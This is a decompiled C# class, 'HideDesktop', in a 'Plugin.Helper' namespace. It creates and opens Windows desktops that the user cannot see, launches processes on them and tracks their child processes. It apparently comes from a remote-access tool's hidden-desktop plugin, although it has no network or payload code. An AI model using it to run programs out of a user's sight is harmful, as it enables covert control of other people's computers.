using System;
using System.Collections.Specialized;
using System.Management;
using System.Runtime.InteropServices;

namespace Plugin.Helper;

public class HideDesktop
{
	private string Desktop_name;

	private bool Disposed_Boolean;

	private static StringCollection StringCollection;

	private IntPtr HDesktop;

	public bool IsOpen => HDesktop != IntPtr.Zero;

	public IntPtr DesktopHandle => HDesktop;

	[DllImport("kernel32.dll")]
	private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref HandelNative.STARTUPINFO lpStartupInfo, ref HandelNative.PROCESS_INFORMATION lpProcessInformation);

	[DllImport("user32.dll")]
	public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, long dwDesiredAccess, IntPtr lpsa);

	[DllImport("user32.dll")]
	public static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, long dwDesiredAccess);

	public static HideDesktop OpenDesktop(string name)
	{
		HideDesktop hideDesktop = new HideDesktop();
		if (!hideDesktop.Open(name))
		{
			return null;
		}
		return hideDesktop;
	}

	public static HideDesktop CreateDesktop(string name)
	{
		HideDesktop hideDesktop = new HideDesktop();
		if (!hideDesktop.Create(name))
		{
			return null;
		}
		return hideDesktop;
	}

	public static bool CreateProcess(string path, string desktop, bool bAppName)
	{
		if (Exists(desktop))
		{
			return OpenDesktop(desktop).CreateProcess(path, bAppName);
		}
		return false;
	}

	public static void CollectProcessAndChildren(int pid)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		if (pid == 0)
		{
			return;
		}
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid).Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				CollectProcessAndChildren(Convert.ToInt32(enumerator.Current["ProcessID"]));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		HandelNative.m_lstProcessID.Add(pid);
	}

	public bool CreateProcess(string path, bool bAppName)
	{
		CheckDisposed();
		if (!IsOpen)
		{
			return false;
		}
		HandelNative.STARTUPINFO lpStartupInfo = default(HandelNative.STARTUPINFO);
		lpStartupInfo.cb = Marshal.SizeOf((object)lpStartupInfo);
		lpStartupInfo.lpDesktop = Desktop_name;
		HandelNative.PROCESS_INFORMATION lpProcessInformation = default(HandelNative.PROCESS_INFORMATION);
		bool result = (bAppName ? CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 32, IntPtr.Zero, null, ref lpStartupInfo, ref lpProcessInformation) : CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 32, IntPtr.Zero, null, ref lpStartupInfo, ref lpProcessInformation));
		CollectProcessAndChildren(lpProcessInformation.dwProcessId);
		return result;
	}

	public static bool Load(HideDesktop desktop)
	{
		if (desktop.IsOpen)
		{
			return HandelNative.SetThreadDesktop(desktop.DesktopHandle);
		}
		return false;
	}

	public bool Create(string name)
	{
		CheckDisposed();
		if (HDesktop != IntPtr.Zero && !Close())
		{
			return false;
		}
		if (Exists(name))
		{
			return Open(name);
		}
		HDesktop = CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, 511L, IntPtr.Zero);
		Desktop_name = name;
		return !(HDesktop == IntPtr.Zero);
	}

	public bool Open(string name)
	{
		CheckDisposed();
		if (HDesktop != IntPtr.Zero && !Close())
		{
			return false;
		}
		HDesktop = OpenDesktop(name, 0, fInherit: false, 511L);
		if (HDesktop == IntPtr.Zero)
		{
			return false;
		}
		Desktop_name = name;
		return true;
	}

	private void CheckDisposed()
	{
		if (Disposed_Boolean)
		{
			throw new ObjectDisposedException("");
		}
	}

	public bool Close()
	{
		CheckDisposed();
		if (HDesktop != IntPtr.Zero)
		{
			bool num = HandelNative.CloseDesktop(DesktopHandle);
			if (num)
			{
				HDesktop = IntPtr.Zero;
				Desktop_name = string.Empty;
			}
			return num;
		}
		return true;
	}

	public static bool Exists(string name)
	{
		return Exists(name, caseInsensitive: false);
	}

	public static bool Exists(string name, bool caseInsensitive)
	{
		string[] desktops = GetDesktops();
		foreach (string text in desktops)
		{
			if (caseInsensitive)
			{
				if (object.Equals(text.ToLower(), name.ToLower()))
				{
					return true;
				}
			}
			else if (object.Equals(text, name))
			{
				return true;
			}
		}
		return false;
	}

	private static bool DesktopProc(string lpszDesktop, IntPtr lParam)
	{
		StringCollection.Add(lpszDesktop);
		return true;
	}

	public static string[] GetDesktops()
	{
		IntPtr processWindowStation = HandelNative.GetProcessWindowStation();
		if (processWindowStation == IntPtr.Zero)
		{
			return new string[0];
		}
		string[] array;
		lock (Valua(ref StringCollection, new StringCollection()))
		{
			if (!HandelNative.EnumDesktops(processWindowStation, DesktopProc, IntPtr.Zero))
			{
				return new string[0];
			}
			array = new string[StringCollection.Count];
			int i = 0;
			for (int num = array.Length - 1; i <= num; i++)
			{
				array[i] = StringCollection[i];
			}
		}
		return array;
	}

	public static T Valua<T>(ref T target, T value)
	{
		target = value;
		return value;
	}
}
